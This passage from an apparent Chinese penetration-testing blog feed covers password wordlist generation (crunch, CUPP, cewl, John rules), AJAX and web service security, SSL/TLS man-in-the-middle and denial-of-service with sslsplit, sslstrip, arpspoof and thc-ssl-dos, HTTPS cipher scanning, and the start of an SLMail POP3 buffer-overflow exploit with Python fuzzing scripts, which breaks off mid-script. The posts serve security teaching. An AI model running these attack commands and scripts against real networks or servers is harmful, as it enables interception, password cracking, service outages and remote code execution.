</li><li>/usr/share/seclists</li></ul><blockquote><h3 id="字典-1"><a href="#字典-1" class="headerlink" title="字典"></a><strong>字典</strong></h3></blockquote><h4 id="键盘空间字符爆破"><a href="#键盘空间字符爆破" class="headerlink" title="键盘空间字符爆破"></a>键盘空间字符爆破</h4><ul><li>全键盘空间字符</li><li>部分键盘空间字符 (基于规则)</li><li>数字、小写字母、大写字母、符号、空格、瑞典字符、高位ASCII码</li></ul><h4 id="crunch-创建字典"><a href="#crunch-创建字典" class="headerlink" title="crunch 创建字典"></a><strong>crunch 创建字典</strong></h4><pre><code>crunch &lt;min-len&gt; &lt;max-len&gt; [&lt;charset string&gt;] [options]&lt;charset string&gt; 默认是小写字符crunch 6 6 0123456789 -o START -d 2 -b 1mb / -c 100-b 按大小分割字典文件(kb/kib、mb/mib、gb/gib)-c 每个字典的行数以上两个参数必须与-o START 结合使用-d 同一字符连贯出现数量(11 / aaa)</code></pre><h4 id="使用字符集"><a href="#使用字符集" class="headerlink" title="使用字符集"></a><strong>使用字符集</strong></h4><p><code>crunch 4 4 -f /usr/share/crunch/charset.lst lalpha-sv -o 1.txt</code></p><h4 id="无重复字符"><a href="#无重复字符" class="headerlink" title="无重复字符"></a><strong>无重复字符</strong></h4><p><code>crunch 1 1 -p 1234567890 | more</code><br>    必须是最后一个参数<br>    最大、最小字符长度失效，但必须存在<br>    与-s 参数不兼容（-s 指定起始字符串）<br><code>crunch 4 4 0123456789 -s 9990</code></p><ul><li>读取文件中每行内容作为基本字符生成字典<br><code>crunch 1 1 -q read</code></li></ul><h4 id="字典组成规则"><a href="#字典组成规则" class="headerlink" title="字典组成规则"></a><strong>字典组成规则</strong></h4><pre><code>crunch 6 6 -t @,%%^^ | more</code></pre><ul><li>@：小写字母 lalpha</li><li>,：大写字母 ualpha</li><li>%：数字 numeric</li><li>^：符号 symbols<h4 id="输出文件压缩"><a href="#输出文件压缩" class="headerlink" title="输出文件压缩"></a><strong>输出文件压缩</strong></h4>  <code>crunch 4 4 -t @,%^ -o 1.txt -z 7z</code><br>   其他压缩格式：gzip、bzip2、lzma<br>   7z压缩比率最大</li></ul><p><strong>Use example:</strong></p><pre><code>crunch 4 4 -f /usr/share/crunch/charset.lst mixalphanumeric-all-space -o w.txt -t @d@@ -s cdabcrunch 4 5 -p dog cat birdcrunch 5 5 abc DEF + \!@# -t ,@^%,    + 占位符    \ 转义符(空格、符号)crunch 5 5 -t ddd%% -p dog cat bird    任何不同于-p 参数指定的值都是占位符crunch 5 5 -d 2@ -t @@@%%组合破解工具应用 crunch 2 4 0123456789 | aircrack-ng a.cap -e MyESSID -w –crunch 10 10 12345 --stdout | airolib-ng testdb -import passwd</code></pre><h4 id="按个人信息生成其专属的密码字典"><a href="#按个人信息生成其专属的密码字典" class="headerlink" title="按个人信息生成其专属的密码字典"></a><strong>按个人信息生成其专属的密码字典</strong></h4><p><strong>CUPP：Common User Password Profiler</strong><br>    git clone <a href="https://github.com/Mebus/cupp.git" target="_blank" rel="noopener">https://github.com/Mebus/cupp.git</a><br>    python cup.py -i</p><p>通过收集网站信息生成字典<br>    cewl 1.1.1.1 -m 3 -d 3 -e -c -v -w a.txt<br>    -m：最小单词长度<br>    -e：收集包含email地址信息<br>    -c：每个单词出现次数<br>    支持基本、摘要 身份认证<br>    支持代理<br><strong>用户密码变型</strong></p><ul><li>基于 cewl 的结果进行密码变型 </li><li>末尾增加数字串</li><li>字母大小写变化</li><li>字母与符号互相转换 </li><li>字母与数字互相转换 </li><li>P@$$w0rd</li></ul><p><strong>使用 John the Ripper 配置文件实现密码动态变型</strong><br>    /etc/john/john.conf<br>    [List.Rules:Wordlist]<br>    $[0-9]$[0-9]$[0-9]<br>    john –wordlist=cewl.txt –rules –stdout &gt; m.txt</p><pre><code>[List.Rules:test]$[0-9]$[0-9]$[0-9]$[a-zA-Z]$[0-9]$[0-9]$[0-9]$[a-zA-Z]$[a-zA-Z]$[a-zA-Z]$[`~!@#$%^&amp;*()\-_=+]john --wordlist=cewl.txt --rules=test --stdout &gt; m.txtjohn --wordlist=ahm.lst --rules=test HASHFILE</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 密码破解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码字典 </tag>
            
            <tag> crunch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AJAX技术组合及WebService安全考虑</title>
      <link href="/2014/05/21/Web_Attacks/AJAX%E6%8A%80%E6%9C%AF%E7%BB%84%E5%90%88%E5%8F%8AWebService%E5%AE%89%E5%85%A8%E8%80%83%E8%99%91/"/>
      <url>/2014/05/21/Web_Attacks/AJAX%E6%8A%80%E6%9C%AF%E7%BB%84%E5%90%88%E5%8F%8AWebService%E5%AE%89%E5%85%A8%E8%80%83%E8%99%91/</url>
      
        <content type="html"><![CDATA[<h4 id="AJAX-Asynchronous-Javascript-and-XML-异步JS和XML"><a href="#AJAX-Asynchronous-Javascript-and-XML-异步JS和XML" class="headerlink" title="AJAX (Asynchronous Javascript and XML)        //异步JS和XML"></a><strong>AJAX</strong> (Asynchronous Javascript and XML)        //异步JS和XML</h4><p>是一个概念,而非一种新的编程语言,是一组现有技术的组合<br>通过客户端脚本动态更新页面部分内容,而非整个页面<br>降低带宽使用,提高速度<br>提升用户体验<br>后台异步访问</p><p><strong>AJAX组件</strong><br>JavaScript: ajax的核心组件,使用XMLHTTPRequest 对象接口向服务器发起请求,接收并处理服务器响应数据<br><strong>Dynamic HTML</strong>(DHTML)<br>早于AJAX出现,通过Javascript,CSS等在客户端修改HTML页面element,缺点是完全依赖客户端代码修改页面,与服务器<br>的交互由JavaScript applets完成,AJAX的XHR弥补了他的缺点(注册用户)<br><strong>Document Object Model(DOM)</strong><br>处理html,xml文档对象的框架,DHTML是一个浏览器,DOM作为其一个实现的接口,定义和管理每个页面元素obj的Properties,method,event.</p><p><strong>基于AJAX的WEB应用工作流程</strong><br>XMLHTTPRequest API创建对象xmlhttp进行访问<br>XML,json,html,文本,图片<br>多个异步请求独立通信,互不依赖<br>AJAX框架<br>    JQuery<br>    Dojo Toolkit<br>    Google web toolkit(GWT)<br>    Microsoft AJAX library</p><p>目前没有通用的AJAX安全最佳实践,其攻击面不为大多数人所知<br>AJAX的安全问题<br>多种技术混合,增加了攻击面,每个参数都可能形成独立的攻击过程<br>AJAX引擎是个全功能的脚本解释器,访问恶意站点可能后果严重,虽然浏览器有砂箱和SOP,但可被绕过<br>服务器,客户端代码结合使用产生混乱,服务器访问控制不当,将信息泄露<br>暴露应用程序逻辑</p><h4 id="AJAX对渗透测试的挑战"><a href="#AJAX对渗透测试的挑战" class="headerlink" title="AJAX对渗透测试的挑战"></a><strong>AJAX对渗透测试的挑战</strong></h4><ul><li>异步请求数量多且隐蔽</li><li>触发AJAX请求的条件无规律</li><li>手动和截断代理爬网可能产生大量遗漏<br>AJAX爬网工具<br>  ZAP<br>客户端代码审计<br>  源码<br>  firebug</li></ul><h4 id="WEB-Service"><a href="#WEB-Service" class="headerlink" title="WEB Service"></a><strong>WEB Service</strong></h4><p>面向服务的架构(Service Oriented Architecture)便于不同系统集成共享数据和功能<br>尤其适合不想暴漏数据模型和程序逻辑而访问数据的场景<br>无页面</p><p><strong>两种类型WEB Service</strong><br>Simple Object Access Protosol(SOAP)        //简单对象访问协议<br>    传统的Web service开发方法,xml是唯一的数据交换格式<br>    要求安全性的应用更多采用<br>RESTful(Representational State Transfer architecture) REST        //代表性状态传输架构<br>    目前更多被采用的轻量web service,JSON是首选数据交换格式</p><h4 id="WEB-Service安全考虑"><a href="#WEB-Service安全考虑" class="headerlink" title="WEB Service安全考虑"></a><strong>WEB Service安全考虑</strong></h4><p>使用API key或session token实现和跟踪身份认证<br>身份认证由服务器完成,而非客户端<br>API key,用户名,Session token永远不要通过URL发送<br>RESTful默认不提供任何安全机制,需要使用SSL/TLS保护传输数据安全<br>SOAP提供强于HTTPS的WS-security机制<br>使用OAuth或HMAC进行身份验证,HMAC身份认证使用C/S共享的密钥加密API key<br>RESTful应只允许身份认证用户使用PUT,DELETE方法<br>使用随机token防止CSRF攻击</p><p>对用户提交参数过滤,建议部署基于严格白名单的方法<br>报错信息消毒<br>直接对象引用应严格身份验证</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> Web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AJAX </tag>
            
            <tag> ZAP </tag>
            
            <tag> DOM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSL_TSL中间人攻击</title>
      <link href="/2014/05/19/Web_Attacks/SSL_TSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
      <url>/2014/05/19/Web_Attacks/SSL_TSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<p>攻击者位于客户端和服务器通信链路中<br>    ARP        // Data link层,修改MAC地址,ARP Spoof让流量流经中间人<br>    DHCP    // 动态主机配置协议,用来自动获取IP<br>    修改网关<br>    修改DNS<br>    修改HOSTS<br>    ICMP,STP,OSPF<br>加密流量        // 伪造证书解密</p><p><strong>攻击的前提</strong></p><ul><li>客户端已经信任伪造证书颁发机构</li><li>攻击者控制了核发证书颁发机构</li><li>客户端程序禁止了显示证书错误告警信息</li><li>攻击者已经控制客户端,并强制其信任伪造证书</li></ul><h4 id="SSLsplit"><a href="#SSLsplit" class="headerlink" title="SSLsplit"></a><strong>SSLsplit</strong></h4><p>透明SSL/TLS中间人攻击工具<br>对客户端伪造成服务器,对服务器伪装成普通客户端<br>伪装服务器需要伪造证书<br>支持SSL/TLS加密的SMTP,POP3,FTP等通信中间人攻击<br><strong>利用openssl生成证书私钥</strong><br>    <code>openssl genrsa -out ca.key 2048</code><br><strong>利用私钥签名生成证书</strong><br>    <code>openssl reg -new -x509 -days 1096 -key ca.key -out ca.crt</code></p><h4 id="启动路由"><a href="#启动路由" class="headerlink" title="启动路由"></a><strong>启动路由</strong></h4><pre><code>sysctl -w net.ipv4.ip_forward=1cat /proc/sys/net/ipv4/ip_forwardecho 1 &gt; /proc/sys/net/ipv4/ip_forward</code></pre><h4 id="Iptables端口转发规则"><a href="#Iptables端口转发规则" class="headerlink" title="Iptables端口转发规则"></a><strong>Iptables端口转发规则</strong></h4><pre><code>iptables -t nat -F        //清空当前已有规则iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443 #MSAiptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443 #SMTPSiptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443 #IMAPSiptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443 #POP3Siptables -t nat -L        //查看nat规则netstat -pantu | grep :80        //查看80端口是否被占用</code></pre><h4 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a><strong>ARP欺骗</strong></h4><pre><code>arpspoof -i eth0 -t 1.1.1.2 -r 1.1.1.1</code></pre><h4 id="启动SSLsplit"><a href="#启动SSLsplit" class="headerlink" title="启动SSLsplit"></a><strong>启动SSLsplit</strong></h4><pre><code>mkdir -p test/logdirsslsplit -D -l connect.log -j /root/test -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</code></pre><p>被害者访问taobao,baidu,mail.163.com<br>查看日志和浏览器证书及证书报错信息<br>安装服务器根证书之后再次访问</p><h4 id="Mitmproxy"><a href="#Mitmproxy" class="headerlink" title="Mitmproxy"></a><strong>Mitmproxy</strong></h4><pre><code>iptables端口转发规则iptables -t nat -F        //清空当前已有规则iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --toport 8080</code></pre><p>Mitmproxy和sslsplit类似,也需要先执行ARP欺骗,且有个BUG,iptables端口只能转发8080有效<br>     mitmproxy -T –host -w mitmproxy.log</p><h4 id="SSLstrip"><a href="#SSLstrip" class="headerlink" title="SSLstrip"></a><strong>SSLstrip</strong></h4><p>与前两种工具不同,将客户端到中间人之间的流量变为明文<br>一样也需要结合ARP欺骗<br>    <code>sslstrip -l 8080</code></p><blockquote><h3 id="SSL-TLS拒绝服务攻击"><a href="#SSL-TLS拒绝服务攻击" class="headerlink" title="SSL/TLS拒绝服务攻击"></a><strong>SSL/TLS拒绝服务攻击</strong></h3></blockquote><ul><li>thc-ssl-dos<br>SSL协商加密对性能开销增加,大量握手请求会导致拒绝服务<br>利用SSL secure Renegotiation特性,在单一TCP连接中生成数千个SSL重连接请求,造成服务器资源过载<br>与流量式拒绝服务攻击不同,thc-ssl-dos可以利用dsl线路打垮30G带宽的服务器<br>服务器平均可以处理300次/秒SSL握手请求<br>对SMTPS,POP3S等服务同样有效<br><code>thc-ssl-dos 1.1.1.1 443 -accept</code></li></ul><p>对策<br>禁用SSL-Renegotiation,使用SSL Accelerator<br>通过修改thc-ssl-dos代码,可以绕过以上对策    </p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> Web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ARP欺骗 </tag>
            
            <tag> SSLsplit </tag>
            
            <tag> DOS攻击 </tag>
            
            <tag> 拒绝服务攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTPS漏洞及攻击方法</title>
      <link href="/2014/05/18/Web_Attacks/HTTPS%E6%BC%8F%E6%B4%9E%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/"/>
      <url>/2014/05/18/Web_Attacks/HTTPS%E6%BC%8F%E6%B4%9E%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="HTTPS攻击"><a href="#HTTPS攻击" class="headerlink" title="HTTPS攻击"></a><strong>HTTPS攻击</strong></h3></blockquote><p>全站HTTPS正成为潮流趋势<br>    淘宝,百度<br>HTTPS的作用<br>    信息安全3要素: <strong><code>CIA</code></strong> (安全性,完整性,可用性)<br>    解决的是信息传输过程中数据被篡改,窃取<br>    加密:对称,非对称,单向<br>HTTPS攻击方法<br>    降级攻击<br>    解密攻击(明文,证书伪造)<br>    协议漏洞,实现方法的漏洞,配置不严格</p><p><strong>SSL</strong>(Secure Socket Layer)    // <em>1安全套接层</em><br>保证网络通信安全的加密协议<br>1994年由Netscape开发成为统一标准<br>1999年 <strong>TLS</strong>(Transport Layer Security)取代SSL v3<br>近年来发现的SSL协议漏洞使业界认为其漏洞已不可软件修复<br>    Heartbleed<br>    POODIE<br>    BEAST<br>TLS 当前最新版本 1.2<br>TLS/SSL,HTTPS,HTTP over SSL 通俗上表示同一含义</p><p>SSL/TLS也被用于其它场景的传输通道加密<br>邮件传输(服务器间,客户端与服务器间)<br>数据库服务器间<br>LDAP身份认证服务器间<br>SSL VPN<br>远程桌面RDP通信过程中的加密和身份认证</p><h4 id="Web通信中的SSL加密"><a href="#Web通信中的SSL加密" class="headerlink" title="Web通信中的SSL加密"></a><strong>Web通信中的SSL加密</strong></h4><p>公钥证书(受信任的第三方证书颁发机构签名颁发)<br>    VeriSign<br>    Thawte<br>    GlobalSign<br>    Symantec</p><h4 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a><strong>加密过程</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A(握手) --&gt;B(协商加密算法) </span><br><span class="line">B --&gt; C(获取公钥证书)</span><br><span class="line">C --&gt; D(验证公钥证书)</span><br><span class="line">D --&gt; E(交换会话密钥)</span><br><span class="line">E --&gt; F(加密信息传输)</span><br></pre></td></tr></table></figure><h4 id="常见加密算法"><a href="#常见加密算法" class="headerlink" title="常见加密算法"></a><strong>常见加密算法</strong></h4><p><strong>非对称加密算法</strong><br>    Diffie-Hellman key exchange<br>    Rivest Shamir Adleman (RSA)<br>    Elliptic Curve Cryptography (ECC)<br><strong>对称加密算法</strong><br>    Data Encryption Standard (DES) / 3DES<br>    Advance Encryption Standard (AES)<br>    International Data Encryption Algorithm (IDEA)<br>    Rivest Cipher 4 (RC4)<br>        WEP̵TLS/SSL̵RDP̵Secure shell<br><strong>单向加密算法</strong></p><table><thead><tr><th>HASH算法</th><th>HASH值长度(bit)</th></tr></thead><tbody><tr><td>MD5</td><td>128</td></tr><tr><td>SHA-1</td><td>160</td></tr><tr><td>SHA-2</td><td>224, 256, 384, 512</td></tr></tbody></table><p>SHA-3已经设计完成,但尚未广泛使用<br>SHA-2是TLS 1.2唯一支持的单向加密算法<br>碰撞攻击针对单向加密算法<br>    两个不同的文件生成相同的HASH值</p><h4 id="SSL的弱点"><a href="#SSL的弱点" class="headerlink" title="SSL的弱点"></a><strong>SSL的弱点</strong></h4><p>SSL是不同的对称,非对称,单向加密算法的组合加密实现(cipher suite)</p><table><thead><tr><th>加密算法</th><th>SSL实现中的用途</th></tr></thead><tbody><tr><td>RAS / Diffle-Hellman</td><td>密钥交换,身份认证</td></tr><tr><td>AES</td><td>加密数据,由RAS/DH完成密钥交换</td></tr><tr><td>HMAC-SHA2</td><td>摘要信息</td></tr></tbody></table><p>服务器端为提供更好的兼容性,选择支持大量过时cipher suite<br>协商过程中强迫降级加密强度<br>现代处理器计算能力可以在可接受的时间内破解过时加密算法<br>购买云计算资源破解</p><h4 id="Openssl"><a href="#Openssl" class="headerlink" title="Openssl"></a><strong>Openssl</strong></h4><p>直接调用openssl库识别目标服务器支持的SSL/TLS cipher suite</p><pre><code>openssl s_client -connect www.baidu.com:443openssl s_client -tls1_2 -cipher &apos;ECDH-RSA-RC4-SHA&apos; -connect www.taobao.com:443    密钥交换-身份认证-数据加密-HASH算法openssl s_client -tls1_2 -cipher “NULL,EXPORT,LOW,DES” -connect  www.taobao.com:443    (协商低安全级别cipher suite)可被破解的cipher suite    openssl ciphers -v &quot;NULL,EXPORT,LOW,DES&quot;https://www.openssl.org/docs/apps/ciphers.html</code></pre><p>Openssl需要大量密码学相关知识,命令复杂,结果可读性差</p><h4 id="SSLScan"><a href="#SSLScan" class="headerlink" title="SSLScan"></a><strong>SSLScan</strong></h4><p>自动识别SSAL配置错误,过期协议,过时cipher suite和hash算法<br>    默认会检查CRIME,heartbleed漏洞<br>    绿色表示安全,红色黄色需要引起注意<br>    TLS支持的cipher suite<br>        <code>sslscan --tlsall www.taobao.com:443</code><br>    分析证书详细数据<br>        <code>sslscan --show-certificate --no-ciphersuites www.taobao.com:443</code></p><h4 id="SSLyze"><a href="#SSLyze" class="headerlink" title="SSLyze"></a><strong>SSLyze</strong></h4><p>Python语言编写<br>    检查SSL过时版本<br>    检查存在弱点的cipther suite<br>    扫描多站点时,支持来源文件<br>    检查是否支持会话恢复<br><code>sslyze --regular  www.taobao.com:443</code></p><h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h4><pre><code>nmap --script=ssl-enum-ciphers.nse www.taobao.comdpkg -L nmap | grep script | grep ssl    #查看nmap扫描ssl相关脚本</code></pre><p><a href="https://www.ssllabs.com/ssltest" target="_blank" rel="noopener">https://www.ssllabs.com/ssltest</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> Web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sslscan </tag>
            
            <tag> Heartbleed </tag>
            
            <tag> 加密算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows缓冲区溢出测试</title>
      <link href="/2013/08/11/pentest/Windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%B5%8B%E8%AF%95/"/>
      <url>/2013/08/11/pentest/Windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<blockquote><h4 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a><strong>缓冲区溢出</strong></h4></blockquote><p>程序漏洞从哪里来<br>    罪恶的根源:变量<br>    数据与代码边界不清<br>    最简漏洞原理—-shell脚本漏洞</p><p>当缓冲区边界限制不严格时,由于变量传入畸形数据或程序运行错误,导致缓冲区被”撑爆”,从而覆盖了相邻内存区域的数据；</p><p>成功修改内存数据,可造成进程劫持,执行恶意代码,获取服务器控制权等后果.</p><p>如何发现漏洞<br>    源码审计<br>    逆向工程<br>    模糊测试<br>        向程序堆栈半随机的数据,根据内存变化判断溢出<br>        数据生成器:生成随机,半随机数据<br>        测试工具:识别溢出漏洞</p><blockquote><h4 id="Windows缓冲区溢出"><a href="#Windows缓冲区溢出" class="headerlink" title="Windows缓冲区溢出"></a>Windows缓冲区溢出</h4></blockquote><p>FUZZER<br>SLMail 5.5.0 Mail Server<br>    POP3 PASS 命令存在缓冲区溢出漏洞<br>    无需身份验证实现远程代码执行<br>    win7++ 已升级DEP ASLR<br>        DEP:阻止代码从数据页被执行<br>        ASLR:随机内存地址加载执行程序和DLL,每次重启地址变化</p><p><code>ImmunityDebugger_1_85setup.exe</code><br><code>mana.py</code></p><p>FUZZING<br>    nc 110端口<br>    了解未知协议<br>        Wireshark<br>        RFC</p><blockquote><h4 id="python代码01-py"><a href="#python代码01-py" class="headerlink" title="python代码01.py"></a>python代码<code>01.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nSending evil buffer...."</span></span><br><span class="line">s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line"></span><br><span class="line">s.send(<span class="string">'USER user'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><p>测试PASS命令接收到大量数据时是否会溢出<br>EIP寄存器存放下一条指令的地址</p><blockquote><h4 id="python代码02-py"><a href="#python代码02-py" class="headerlink" title="python代码02.py"></a>python代码<code>02.py</code></h4></blockquote><p>以每200递增循环发送A,测试溢出点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">buffer=[<span class="string">"A"</span>]</span><br><span class="line">counter=<span class="number">100</span></span><br><span class="line"><span class="keyword">while</span> len(buffer)&lt;=<span class="number">30</span>:</span><br><span class="line">buffer.append(<span class="string">"A"</span>=*counter)</span><br><span class="line">counter=counter+<span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> string <span class="keyword">in</span> buffer:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Fuzzing PASS with %s bytes"</span> % len(string)</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+string+<span class="string">'\r\n'</span>)</span><br><span class="line">s.send(<span class="string">'QUIT\r\n'</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><blockquote><h4 id="2700个字符实现EIP寄存器溢出03-py"><a href="#2700个字符实现EIP寄存器溢出03-py" class="headerlink" title="2700个字符实现EIP寄存器溢出03.py"></a>2700个字符实现EIP寄存器溢出<code>03.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=<span class="string">'A'</span>*<span class="number">2700</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><p>找到精确溢出的4个字符<br>    二分法<br>    唯一字串法<br>        <code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700</code></p><blockquote><h4 id="python代码04-py"><a href="#python代码04-py" class="headerlink" title="python代码04.py"></a>python代码<code>04.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=</span><br><span class="line"><span 